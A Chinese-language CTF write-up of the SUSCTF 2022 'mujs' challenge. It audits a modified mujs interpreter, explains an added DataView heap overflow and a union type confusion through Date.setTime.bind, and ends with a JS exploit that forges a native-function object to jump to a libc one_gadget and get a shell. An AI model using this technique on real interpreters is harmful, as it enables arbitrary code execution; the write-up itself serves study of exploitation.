---
title: susctf2022_mujs
date: 2022-03-03 14:34:52
permalink: /pages/864c37/
categories:
  - ctf_wp
  - xctf
tags:
  - 
---
# susctf 2022 mujs 

[[toc]]

## 题目信息

**mujs**

dd0a0972b4428771e6a3887da2210c7c9dd40f9c
nc 124.71.182.21 9999

解题人数： 10

题目分值： 689

链接到远程以后要求输入js代码，也就是我们的exp应该是js程序， 通过这个mujs的漏洞攻击c层， 实现getshell。

## 代码审计

拿到题目发现给了源码，而且看起来应该是个完整的项目，在github找到[mujs](https://github.com/ccxvii/mujs)， 翻找了一下相关cve等，并对照最新的cve和题目文件，发现也修复了，猜测是最新版本的mujs, clone下来，直接diff一下两个文件夹， 发现题目文件多了一个`jsdataview.c`文件， 并且相应位置都做了修改，

`make debug`生成有符号的文件，可以开始调试， 逐渐理解这个js解释器的实现，

### 执行流程 

从main函数开始，配合diff可以看到，注释掉了大部分的内置函数，只留下了个print， 

![image-20220303144859294](https://s2.loli.net/2022/03/03/Z5kysG4TYEzXMJ9.png)

后面是如果有文件的话会运行文件，没有文件进入交互状态执行，这里我们直接看有文件运行的情况即可。进入函数`js_dofille`, 

函数本身逻辑不复杂， 首先`js_loadfile`， 然后简单设置了一下栈， 进入`js_call`函数运行代码。

```c

int js_dofile(js_State *J, const char *filename)
{
	if (js_ptry(J)) {
		js_report(J, "exception stack overflow");
		js_pop(J, 1);
		return 1;
	}
	if (js_try(J)) {
		js_report(J, js_trystring(J, -1, "Error"));
		js_pop(J, 1);
		return 1;
	}
	js_loadfile(J, filename);
	js_pushundefined(J);
	js_call(J, 0);
	js_pop(J, 1);
	js_endtry(J);
	return 0;
}
```

然后编译部分应该在`js_loadfile`里，但是基本不用看， 

`js_call`函数如下， 从栈中获取`obj`， 然后这个`obj`就是要调用的函数，支持三种形式

* `JS_CFUNCTION`是js代码中的函数的语句
* `JS_CSCRIPT`是js代码中直接写然后被运行了的语句。
* `JS_CCFUNCTION`是js代码调用一些c实现的内置函数， 进入c语言层运行。

这里还有个`jsR_pushtrace`函数用来做简单记录。

```c

void js_call(js_State *J, int n) {
  js_Object *obj;
  int savebot;

  if (n < 0)
    js_rangeerror(J, "number of arguments cannot be negative");

  if (!js_iscallable(J, -n - 2))
    js_typeerror(J, "%s is not callable", js_typeof(J, -n - 2));

  obj = js_toobject(J, -n - 2);

  savebot = BOT;
  BOT = TOP - n - 1;

  if (obj->type == JS_CFUNCTION) {
    jsR_pushtrace(J, obj->u.f.function->name, obj->u.f.function->filename,
                  obj->u.f.function->line);
    if (obj->u.f.function->lightweight)
      jsR_calllwfunction(J, n, obj->u.f.function, obj->u.f.scope);
    else
      jsR_callfunction(J, n, obj->u.f.function, obj->u.f.scope);
    --J->tracetop;
  } else if (obj->type == JS_CSCRIPT) {
    jsR_pushtrace(J, obj->u.f.function->name, obj->u.f.function->filename,
                  obj->u.f.function->line);
    jsR_callscript(J, n, obj->u.f.function, obj->u.f.scope);
    --J->tracetop;
  } else if (obj->type == JS_CCFUNCTION) {
    jsR_pushtrace(J, obj->u.c.name, "native", 0);
    jsR_callcfunction(J, n, obj->u.c.length, obj->u.c.function);
    --J->tracetop;
  }

  BOT = savebot;
}
```

js层的代码， `JS_CFUNCTION`和`JS_CSCRIPT`两个类型， function类型可能要简单设置参数等，但是最后都会进入`jsR_run`函数，这里就是获取opcode并执行的位置，一个典型的大的`while+switch`语句。

c层的代码，通过`jsR_callcfunction`函数调用。

```c
static void jsR_callcfunction(js_State *J, int n, int min, js_CFunction F) {
  int i;
  js_Value v;

  for (i = n; i < min; ++i)
    js_pushundefined(J);

  F(J);
  v = *stackidx(J, -1);
  TOP = --BOT; /* clear stack */
  js_pushvalue(J, v);
}
```

主要执行流程就是如此，除了main函数内置函数被取出了大部分以外基本没有做修改。

### 数据结构 

js中的数据类型全部都是`js_Object`结构体，由于每种类型使用的数据不同，而且不会存在同时表示两个类型的情况，这里使用`union`将不同类型的数据都放在一起了。

```c

struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	int count; /* number of properties, for array sparseness check */
	js_Object *prototype;
	union {
		int boolean;
		double number;
		struct {
			const char *string;
			int length;
		} s;
		struct {
			int length;
		} a;
		struct {
			js_Function *function;
			js_Environment *scope;
		} f;
		struct {
			const char *name;
			js_CFunction function;
			js_CFunction constructor;
			int length;
			void *data;
			js_Finalize finalize;
		} c;
		js_Regexp r;
		struct {
			js_Object *target;
			js_Iterator *head;
		} iter;
		struct {
			const char *tag;
			void *data;
			js_HasProperty has;
			js_Put put;
			js_Delete delete;
			js_Finalize finalize;
		} user;
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
	} u;
	js_Object *gcnext; /* allocation list */
	js_Object *gcroot; /* scan list */
	int gcmark;
};
```

题目添加的是最后一个 `object.u.dataview`结构，

当在js中定义新的结构时， 会自动转向对应的创建函数，在`jsbuiltin.c`函数中，`jsB_init`函数在程序载入文件之前进行各种类型的初始化，设置原型和调用各个类型的初始化函数，注册对应类型的相关函数。

```c
void jsB_init(js_State *J)
{
	/* Create the prototype objects here, before the constructors */
	J->Object_prototype = jsV_newobject(J, JS_COBJECT, NULL);
	J->Array_prototype = jsV_newobject(J, JS_CARRAY, J->Object_prototype);
	J->Function_prototype = jsV_newobject(J, JS_CCFUNCTION, J->Object_prototype);
	J->Boolean_prototype = jsV_newobject(J, JS_CBOOLEAN, J->Object_prototype);
	J->Number_prototype = jsV_newobject(J, JS_CNUMBER, J->Object_prototype);
	J->String_prototype = jsV_newobject(J, JS_CSTRING, J->Object_prototype);
	J->Date_prototype = jsV_newobject(J, JS_CDATE, J->Object_prototype);

	J->RegExp_prototype = jsV_newobject(J, JS_CREGEXP, J->Object_prototype);
	J->RegExp_prototype->u.r.prog = js_regcompx(J->alloc, J->actx, "(?:)", 0, NULL);
	J->RegExp_prototype->u.r.source = js_strdup(J, "(?:)");

	J->DataView_prototype = jsV_newobject(J, JS_CDATAVIEW, J->Object_prototype);

	/* All the native error types */
	J->Error_prototype = jsV_newobject(J, JS_CERROR, J->Object_prototype);
	J->EvalError_prototype = jsV_newobject(J, JS_CERROR, J->Error_prototype);
	J->RangeError_prototype = jsV_newobject(J, JS_CERROR, J->Error_prototype);
	J->ReferenceError_prototype = jsV_newobject(J, JS_CERROR, J->Error_prototype);
	J->SyntaxError_prototype = jsV_newobject(J, JS_CERROR, J->Error_prototype);
	J->TypeError_prototype = jsV_newobject(J, JS_CERROR, J->Error_prototype);
	J->URIError_prototype = jsV_newobject(J, JS_CERROR, J->Error_prototype);

	/* Create the constructors and fill out the prototype objects */
	jsB_initobject(J);
	jsB_initarray(J);
	jsB_initfunction(J);
	jsB_initboolean(J);
	jsB_initnumber(J);
	jsB_initstring(J);
	jsB_initregexp(J);
	jsB_initdate(J);
	jsB_initerror(J);
	jsB_initmath(J);
	jsB_initjson(J);
	jsB_initdataview(J);

	/* Initialize the global object */
	js_pushnumber(J, NAN);
	js_defglobal(J, "NaN", JS_READONLY | JS_DONTENUM | JS_DONTCONF);

	js_pushnumber(J, INFINITY);
	js_defglobal(J, "Infinity", JS_READONLY | JS_DONTENUM | JS_DONTCONF);

	js_pushundefined(J);
	js_defglobal(J, "undefined", JS_READONLY | JS_DONTENUM | JS_DONTCONF);

	jsB_globalf(J, "parseInt", jsB_parseInt, 1);
	jsB_globalf(J, "parseFloat", jsB_parseFloat, 1);
	jsB_globalf(J, "isNaN", jsB_isNaN, 1);
	jsB_globalf(J, "isFinite", jsB_isFinite, 1);

	jsB_globalf(J, "decodeURI", jsB_decodeURI, 1);
	jsB_globalf(J, "decodeURIComponent", jsB_decodeURIComponent, 1);
	jsB_globalf(J, "encodeURI", jsB_encodeURI, 1);
	jsB_globalf(J, "encodeURIComponent", jsB_encodeURIComponent, 1);
}

```

题目增加的是`jsB_initdataview`函数，设置了对应类型在js层的名字和原型方法 创建函数，

```c
void jsB_initdataview(js_State *J)
{
	js_pushobject(J, J->DataView_prototype);
	{
		jsB_propf(J, "DataView.prototype.getUint8", Dv_getUint8, 1);
		jsB_propf(J, "DataView.prototype.setUint8", Dv_setUint8, 2);
		jsB_propf(J, "DataView.prototype.getUint16", Dv_getUint16, 1);
		jsB_propf(J, "DataView.prototype.setUint16", Dv_setUint16, 2);
		jsB_propf(J, "DataView.prototype.getUint32", Dv_getUint32, 1);
		jsB_propf(J, "DataView.prototype.setUint32", Dv_setUint32, 2);
		jsB_propf(J, "DataView.prototype.getLength", Dv_getLength, 0);
	}
	js_newcconstructor(J, jsB_new_DataView, jsB_new_DataView, "DataView", 0);
	js_defglobal(J, "DataView", JS_DONTENUM);
}
```

分析创建函数

```c
static void jsB_new_DataView(js_State *J) {
	int top = js_gettop(J);
	size_t size;

	if (top != 2) {
		js_typeerror(J, "new DataView expects a size");
	}
	size = js_tonumber(J, 1);

	js_Object *obj = jsV_newobject(J, JS_CDATAVIEW, J->DataView_prototype);
	obj->u.dataview.data = js_malloc(J, size);
	memset(obj->u.dataview.data, 0, size);
	obj->u.dataview.length = size;
	js_pushobject(J, obj);
}
```

其实就是申请一个堆块，然后相关方法都是get set这个内存块。

### 漏洞

这个位置， 存在一个溢出， 可以向后溢出0x9字节。

```c
static void Dv_setUint8(js_State *J)
{
	js_Object *self = js_toobject(J, 0);
	if (self->type != JS_CDATAVIEW) js_typeerror(J, "not an DataView");
	size_t index = js_tonumber(J, 1);
	uint8_t value = js_tonumber(J, 2);
	if (index < self->u.dataview.length+0x9) {
		self->u.dataview.data[index] = value;
	} else {
		js_error(J, "out of bounds access on DataView");
	}
}
```

这里是向前溢出0x3字节，但是只能改本chunk的size位， 比较难利用。

```c
static void Dv_setUint32(js_State *J)
{
	js_Object *self = js_toobject(J, 0);
	if (self->type != JS_CDATAVIEW) js_typeerror(J, "not an DataView");
	size_t index = js_tonumber(J, 1);
	uint32_t value = js_tonumber(J, 2);

	if (index+3 < self->u.dataview.length) {
		*(uint32_t*)&self->u.dataview.data[index] = value;
	} else {
		js_error(J, "out of bounds access on DataView");
	}
}
```

## 利用

目前是向后溢出0x9字节，这个距离正好可以越过size位， 修改下个堆快的第一个字符， 

这里很容易想到`js_Object`， 因为这个位置正好是`type`， 而通过`union`可以实现类型混淆，

### 堆风水

于是这里的思路是调试一下堆风水，利用这个类型混淆进行修改下个object, 那么堆应该是`a.u.dataview.data`挨着`b`， 

```js
a = DataView(0x68);
b = DataView(0x68);
```

首次进入`jsB_new_DataView`的时候，堆环境很乱，重要的点如下:

* tcache和fastbin中大量存在0x60 chunk， 
* unsorted bin中存在大堆快，可能存在一些0xb0/0xc0之类较小的堆快。

思路大概是， 尝试一直从这个大堆快中获取内存，这样内存是挨着的，可以达到要求。

我们的`js_Object`结构体本身大小为0x68， 申请0x70左右的堆快，然后这个`u.dataview.data`位置的堆块大小我们可以控制。

另外， 在`jsR_run`函数打印opcode出来，在`js_malloc`函数打印堆快的变化，

这个call函数调用了`DataView`创建函数，我们data大小也是0x68, 在setvar时， 会有另一个malloc, 

![image-20220303154900605](https://s2.loli.net/2022/03/03/boqkCdjrKTLJvuM.png)

对应位置:

![image-20220303155136832](https://s2.loli.net/2022/03/03/GaHPvzwO9276mfp.png)

应该是形成一个`value-object`的映射。

函数逻辑也比较简单，如果可以查找到这个变量， 则进行修改，这里修改可能存在有`setter`的情况那么通过`setter`进行修改，

如果找不到，则将搜索的环境向外扩张一层，

> 这也比较好理解， 如果函数内局部变量找不到就找全局变量， 这么个意思。

如果真没有，那么`jsR_setpropertty`函数创建新的。这个要创建的`js_Property`就是这个0x40的堆快申请。

```c
static void js_setvar(js_State *J, const char *name) {
  js_Environment *E = J->E;
  do {
    js_Property *ref = jsV_getproperty(J, E->variables, name);
    if (ref) {
      if (ref->setter) {
        js_pushobject(J, ref->setter);
        js_pushobject(J, E->variables);
        js_copy(J, -3);
        js_call(J, 1);
        js_pop(J, 1);
        return;
      }
      if (!(ref->atts & JS_READONLY))
        ref->value = *stackidx(J, -1);
      else if (J->strict)
        js_typeerror(J, "'%s' is read-only", name);
      return;
    }
    E = E->outer;
  } while (E);
  if (J->strict)
    js_referenceerror(J, "assignment to undeclared variable '%s'", name);
  jsR_setproperty(J, J->G, name, 0);
}
```

于是， 我们创建的变量的时候内存分配如下:

``` 
obj = malloc(0x68) // js_Object
data = malloc(xx) // from user 
var = malloc(0x40) // js_Perperty 
```

我们期望 data和下一个obj挨着，主要思路就是使用 `unsorted bin`中的大堆快进行切割，

有一下两个思路

* 预留出来几个0x50大小，给`js_Property`， 让data和obj来每次切割大堆快。
* 重复使用变量，使用`js_setvar`中的逻辑，这样会复用原来的`js_Property`， 不会申请堆快。

最开始我尝试使用第一个思路，但是因为后续js代码的修改，导致编译不同， 这些小一些的`unsorted bin`不稳定存在， 这样利用就有一定概率性，甚至可能一直不行。于是使用第二个思路，这个构造起来也比较简单。

```js
a = DataView(0x68);
a = DataView(0x68);
b = DataView(0x68);
// heap : a-a.data-b

a.setUint8(0x68 + 0x8, xxx);
// b is a xx type
```

这个可以稳定利用。

### 类型混淆

其实这里思路也很简单，我们目前使用`Dataview`， 使用的是`js_object.u.dataview`的这部分

```c
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
```

每次内存读写的检测都是这个`self.u.dataview.length`， 

同时这个位置的`obj.u`为`union`， 天然的一个类型混淆，

```c
	union {
		int boolean;
		double number;
		struct {
			const char *string;
			int length;
		} s;
		struct {
			int length;
		} a;
		struct {
			js_Function *function;
			js_Environment *scope;
		} f;
		struct {
			const char *name;
			js_CFunction function;
			js_CFunction constructor;
			int length;
			void *data;
			js_Finalize finalize;
		} c;
		js_Regexp r;
		struct {
			js_Object *target;
			js_Iterator *head;
		} iter;
		struct {
			const char *tag;
			void *data;
			js_HasProperty has;
			js_Put put;
			js_Delete delete;
			js_Finalize finalize;
		} user;
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
	} u;
```

我查看了这些类型对应的方法，主要是`set`之类的方法。

在`jsB_initdate`中找到了这些方法，

```c
		jsB_propf(J, "Date.prototype.setTime", Dp_setTime, 1);
		jsB_propf(J, "Date.prototype.setMilliseconds", Dp_setMilliseconds, 1);
		jsB_propf(J, "Date.prototype.setUTCMilliseconds", Dp_setUTCMilliseconds, 1);
		jsB_propf(J, "Date.prototype.setSeconds", Dp_setSeconds, 2);
		jsB_propf(J, "Date.prototype.setUTCSeconds", Dp_setUTCSeconds, 2);
		jsB_propf(J, "Date.prototype.setMinutes", Dp_setMinutes, 3);
		jsB_propf(J, "Date.prototype.setUTCMinutes", Dp_setUTCMinutes, 3);
		jsB_propf(J, "Date.prototype.setHours", Dp_setHours, 4);
		jsB_propf(J, "Date.prototype.setUTCHours", Dp_setUTCHours, 4);
		jsB_propf(J, "Date.prototype.setDate", Dp_setDate, 1);
		jsB_propf(J, "Date.prototype.setUTCDate", Dp_setUTCDate, 1);
		jsB_propf(J, "Date.prototype.setMonth", Dp_setMonth, 2);
		jsB_propf(J, "Date.prototype.setUTCMonth", Dp_setUTCMonth, 2);
		jsB_propf(J, "Date.prototype.setFullYear", Dp_setFullYear, 3);
		jsB_propf(J, "Date.prototype.setUTCFullYear", Dp_setUTCFullYear, 3);
```

而后发现他们全部转入`js_setdate`函数

```c
static void js_setdate(js_State *J, int idx, double t)
{
	js_Object *self = js_toobject(J, idx);
	if (self->type != JS_CDATE)
		js_typeerror(J, "not a date");
	self->u.number = TimeClip(t);
	js_pushnumber(J, self->u.number);
}
```

这里修改`self->u.number`其实和`self->u.dataview.length` 在同一位置，

那么通过这些函数我们都可以修改`length`， 并将内存读写范围扩大。

这里选择了最可控的一个

```c
static void Dp_setTime(js_State *J)
{
	js_setdate(J, 0, js_tonumber(J, 1));
}
```

这里其实还存在一个小问题

number 定义为`double number;`， 占8字节， legnth定义为 `uint32_t length;`, 占后4字节。当然在dataview中会进行对齐，所以length前4字节被摸除。

这个赋值的时候通过`TimeClip`函数修改了: 

```c
static double TimeClip(double t)
{
	if (!isfinite(t))
		return NAN;
	if (fabs(t) > 8.64e15)
		return NAN;
	return t < 0 ? -floor(-t) : floor(t);
}

```

如果满足规则， 则调用`floor`函数，并返回，这个函数作用就是清除小数位， 

double内存中保存为如下的状态： 

![image-20220303164408712](https://s2.loli.net/2022/03/03/P12AjfbqunOKIY6.png)

 

sign符号位表示正负， exponet是指数位 表示2^e， fraction是尾数位， 

一般是 (-1)^ sign * (1 + fraction) * 2^e ， 

目前清楚小数位以后，这个fraction很可能只有高位存在一部分，那么我们使用length时的第四字节全是0, 

这时候要让这个数据尽可能的大， 这样整数部分够多，会转换为指数位很大并且尾数位也很多的情况，我们的length就有数据了。

### 函数调用

另一个问题出现在函数调用的时候， 我们目前exp如下： 

```js
a = DataView(0x68);
a = DataView(0x68);
b = DataView(0x68);
c = DataView(0x68);
// heap : c-c.data-d

a.setUint8(0x68 + 0x8, 0xa);
// b is a Date type
```

如果现在使用`b.setTime`的话，是不行的，因为这些类型对应的函数是通过原型进行调用的。

我们可以稍微patch代码， 增加一些信息打印，然后看到opcode等， 可以观察到这个`setUint8`函数调用过程, 

首先获取变量a, 然后重复一份， 容纳后获取prop`setUint8`，后面是栈顶两个元素`prop`和`object`换位变成`prop-object`， 然后压栈整数， 这是我们的参数，然后调用函数，

![image-20220303172427674](https://s2.loli.net/2022/03/03/5x6ZEsrziya1S4n.png)

那么这个函数调用，也是走的`js_call`， 我们可以回顾下，目标函数其实是这个obj， n表示参数个数，那么这个`-n-2`的距离，在我们分析的这个例子中就是这个prop `setUint8`， 

![image-20220303172654644](https://s2.loli.net/2022/03/03/aTMgc5OLy4rXuqw.png)

于是跟进一下这个 opcode， 

![image-20220303172809644](https://s2.loli.net/2022/03/03/ZyrE93TtuD8nP2J.png)

主要还是`jsR_getproperty`函数， 如下 转入`jsR_hasproperty`函数，

这个函数首先根据类型判断了一些直接进行操作的方法，

然后如果不是内置的， 则需要拓展，进入`jsV_getproperty`函数，

```c
static void jsR_getproperty(js_State *J, js_Object *obj, const char *name) {
  if (!jsR_hasproperty(J, obj, name))
    js_pushundefined(J);
}

static int jsR_hasproperty(js_State *J, js_Object *obj, const char *name) {
  js_Property *ref;
  int k;

  if (obj->type == JS_CARRAY) {
    if (!strcmp(name, "length")) {
      js_pushnumber(J, obj->u.a.length);
      return 1;
    }
  }

  else if (obj->type == JS_CSTRING) 
    .....
  
  ref = jsV_getproperty(J, obj, name);
  if (ref) {
    if (ref->getter) {
      js_pushobject(J, ref->getter);
      js_pushobject(J, obj);
      js_call(J, 0);
    } else {
      js_pushvalue(J, ref->value);
    }
    return 1;
  }

  return 0;
}
```

查看这个函数， 其实就是顺着`prototype`这个单项链表查找， 这个其实就是原型链。

```c
js_Property *jsV_getproperty(js_State *J, js_Object *obj, const char *name)
{
	do {
		js_Property *ref = lookup(obj->properties, name);
		if (ref)
			return ref;
		obj = obj->prototype;
	} while (obj);
	return NULL;
}
```

我们的`setUint8`也就是在这里找到的，那么在那里定义的呢？

在`jsB_initdataview`初始化函数中， 调用 `jsB_propf`进行设置。

而这个`obj->properties`是在创建这个对象的过程中进行定义的。在`jsB_new_DataView`创建对象使用`jsV_newobject`函数，这个函数第三个参数就是原型

```c
js_Object *jsV_newobject(js_State *J, enum js_Class type, js_Object *prototype)
{
	js_Object *obj = js_malloc(J, sizeof *obj);
	memset(obj, 0, sizeof *obj);
	obj->gcmark = 0;
	obj->gcnext = J->gcobj;
	J->gcobj = obj;
	++J->gccounter;

	obj->type = type;
	obj->properties = &sentinel;
	obj->prototype = prototype;
	obj->extensible = 1;
	return obj;
}
```

于是这个调用关系也理清了，

那么问题来了，我们目前只是修改了`obj->type`位置。这个可以获取方法的原型仍然指向`DataView`， 所以没办法直接调用`setTime`函数， 

在测试中我们发现， 其实可以直接使用`Date.prototype.setTime`调用对应的函数，但是这时在函数内的`self`是指向的默认`Date`实例。

这时候搜了下相关的东西，没发现杀，翻找了下程序其他位置看看是否还有什么离谱的方法可以配合使用。找到了这么一个位置。

对于function类型对象，定义了几个可用的方法，在js代码中定义的函数和预先设置好的c层的内置函数都有对应的fcuntion结构体，都可以使用这几个方法。

```c

void jsB_initfunction(js_State *J)
{
	J->Function_prototype->u.c.name = "Function.prototype";
	J->Function_prototype->u.c.function = jsB_Function_prototype;
	J->Function_prototype->u.c.constructor = NULL;
	J->Function_prototype->u.c.length = 0;

	js_pushobject(J, J->Function_prototype);
	{
		jsB_propf(J, "Function.prototype.toString", Fp_toString, 2);
		jsB_propf(J, "Function.prototype.apply", Fp_apply, 2);
		jsB_propf(J, "Function.prototype.call", Fp_call, 1);
		jsB_propf(J, "Function.prototype.bind", Fp_bind, 1);
	}
	js_newcconstructor(J, jsB_Function, jsB_Function, "Function", 1);
	js_defglobal(J, "Function", JS_DONTENUM);
}

```

这里面值得注意的是`Fp_bind`函数， 稍微有点复杂， 总的来说前面一点检测，然后是使用`js_newcconstructor`设置了一个`JS_CCFUNCTION`类型对象，后续就是使用`js_defproperty`为这个对象设置了三个`property`， `__TargetFunction__`, `__BoundThis__`, `__BoundArguments__`， 

```c
static void Fp_bind(js_State *J)
{
	int i, top = js_gettop(J);
	int n;

	if (!js_iscallable(J, 0))
		js_typeerror(J, "not a function");

	n = js_getlength(J, 0);
	if (n > top - 2)
		n -= top - 2;
	else
		n = 0;

	/* Reuse target function's prototype for HasInstance check. */
	js_getproperty(J, 0, "prototype");
	js_newcconstructor(J, callbound, constructbound, "[bind]", n);

	/* target function */
	js_copy(J, 0);
	js_defproperty(J, -2, "__TargetFunction__", JS_READONLY | JS_DONTENUM | JS_DONTCONF);

	/* bound this */
	js_copy(J, 1);
	js_defproperty(J, -2, "__BoundThis__", JS_READONLY | JS_DONTENUM | JS_DONTCONF);

	/* bound arguments */
	js_newarray(J);
	for (i = 2; i < top; ++i) {
		js_copy(J, i);
		js_setindex(J, -2, i - 2);
	}
	js_defproperty(J, -2, "__BoundArguments__", JS_READONLY | JS_DONTENUM | JS_DONTCONF);
}
```

这个新的`JS_CCFUNCTION`对象，

* 有一个对这个函数的构造函数为`constructbound`， 在想要创建这个函数时会调用他(比如制定这个bind的函数结果为一个值的话，会进入`OP_NEW`在这个调用链上会使用这个`obj->u.c.constructor`)，

* 有一个对应的c语言函数， 在被调用的时候跳转过去，`OP_CALL`的时候调用`js_call`， 会调用 `obj->u.c.function`函数， 在这里定义是`callbound`函数，

如下是`js_newccountstructor`函数。

```c
/* prototype -- constructor */
void js_newcconstructor(js_State *J, js_CFunction cfun, js_CFunction ccon, const char *name, int length)
{
	js_Object *obj = jsV_newobject(J, JS_CCFUNCTION, J->Function_prototype);
	obj->u.c.name = name;
	obj->u.c.function = cfun;
	obj->u.c.constructor = ccon;
	obj->u.c.length = length;
	js_pushobject(J, obj); /* proto obj */
	{
		js_pushnumber(J, length);
		js_defproperty(J, -2, "length", JS_READONLY | JS_DONTENUM | JS_DONTCONF);
		js_rot2(J); /* obj proto */
		js_copy(J, -2); /* obj proto obj */
		js_defproperty(J, -2, "constructor", JS_DONTENUM);
		js_defproperty(J, -2, "prototype", JS_DONTENUM | JS_DONTCONF);
	}
}
```

因为我们只是一次函数调用， 所以只关注`callbound`函数即可。

可以看到会对前面提到的三个 `property`进行解析，然后依次压栈， 这个顺序其实和我们本身调用原型方法函数的顺序是一致的，首先是函数，然后是调用实例(或者在js中应该是this指针， 在c层实现中写的是self)， 然后接下来是参数，最后使用`js_call`进行调用。

```c
static void callbound(js_State *J) {
  int top = js_gettop(J);
  int i, fun, args, n;

  fun = js_gettop(J);
  js_currentfunction(J);
  js_getproperty(J, fun, "__TargetFunction__");
  js_getproperty(J, fun, "__BoundThis__");

  args = js_gettop(J);
  js_getproperty(J, fun, "__BoundArguments__");
  n = js_getlength(J, args);
  if (n < 0)
    n = 0;
  for (i = 0; i < n; ++i)
    js_getindex(J, args, i);
  js_remove(J, args);

  for (i = 1; i < top; ++i)
    js_copy(J, i);

  js_call(J, n + top - 1);
}
```

这一套操作也可以在`opcode`层面做对照，是这样的

前半部分，相当于是用`setTime`这个实例来调用`bind`方法，参数是b (也就是我们exp.js中被修改的那个实例)， 可以看到去到了`Function.prototype.bind` 函数运行， 后面再次传入参数以后进行调用， 其实就是调用的`setTime.bind(b)`这个整体作为的一个函数，

可以看到先进入了`[bind]`名字的函数，也就是我们上面看到的`js_newccountructor`函数创建的那个函数，然后再转入到`Date.prototype.setTime` 函数。

![image-20220303213206503](https://s2.loli.net/2022/03/03/WDLtoMAuCVOPial.png)

于是我们得到了一个可以不通过原型链去调用方法函数的方案，

`Data.prototype.setTime.bind(b)(0x30) = b.setTime(0x30)`， 如果b原型链有setTime的话那么两者是一样的，如果没有可以通过前者去调用。

后者的调用逻辑是, 压栈对象实例， 通过调用链找到`setTime`函数，然后互换栈顶的函数和实例，然后压栈参数，形成从栈顶往下为: `参数 | 实例 | 函数`，  然后`OP_CALL`opcode或者说调用了`js_call`函数， 

前者相当于封装了一个新函数`[bind]`， 完成 `参数 | 实例 | 函数`的内存布局， 然后调用`js_call`函数，

两者的效果一致。

### getshell

然后利用思路基本就完整了，上一步将`obj->u.dataview.length` 修改以后，基本可以实现内存在一个较大范围内的任意读写，

然后在后面再次申请一个obj结构体(其实这个是啥都ok)， 然后将其修改为`JS_CCFUNCTION`类型对象，设置好`obj->u.c.function`，然后进行调用，可以在c层实现代码执行。

可能还要泄漏数据，通过堆 main_arean进行泄漏。

## exp

首先是申请内存，重复覆盖一个变量，这样达到`a.data | b | b.data`的效果，

然后可以使用`a`的越界修改`b->type`为`JS_DATE`， 并通过`setTime`函数修改`b->number`位置，这里低位同时是`b->u.dataview.length`， 将`b`修改回`JS_DATAVIEW`， 这时候`b`可读写的内存巨大，可以直接往后获取main_arean, 然后往后修改下一个object， 改成一个`JS_CCFUNCTION`类型， 设置好对应function,  然后main_arean计算偏移到libc_base， 再到onegadget, 

```js
a = DataView(0x68);
a = DataView(0x68);
b = DataView(0x68);
c = DataView(0x68);
// heap : c-c.data-d

a.setUint8(0x68 + 0x8, 0xa);
// b is a Date type
Date.prototype.setTime.bind(b)(1e12);
// b.u.dataview.length = (int)(double)(time);
a.setUint8(0x68 + 0x8, 0x10);
// b is a DataView

main_arean_low = b.getUint32(0x4f0);
main_arean_high = b.getUint32(0x4f4 + 0x51);

main_arean_low = main_arean_low // - main_arean_relative_address + onegadget_relative_address

b.setUint8(0xc0, 4); // c->type = JS_CCFUNCTION
b.setUint32(0xe0, 0); // c->u.c.name = 0
b.setUint32(0xe8, main_arean_low); // c->u.c.function 
b.setUint32(0xe8 + 4, main_arean_high); // c_>u.c.function

c();
```

调试可以发现这个可以通

![image-20220303220924999](https://s2.loli.net/2022/03/03/1ctNlGI5qY9ZEju.png)

观察下one gadget 

![image-20220303221056510](https://s2.loli.net/2022/03/03/HuhcfYGQtxWykmd.png)

其中这个 0xe6c84 的onegadget可以成功 

![image-20220303221200515](https://s2.loli.net/2022/03/03/dcoZSBCLyNqwgXa.png)

然后可以getshell 

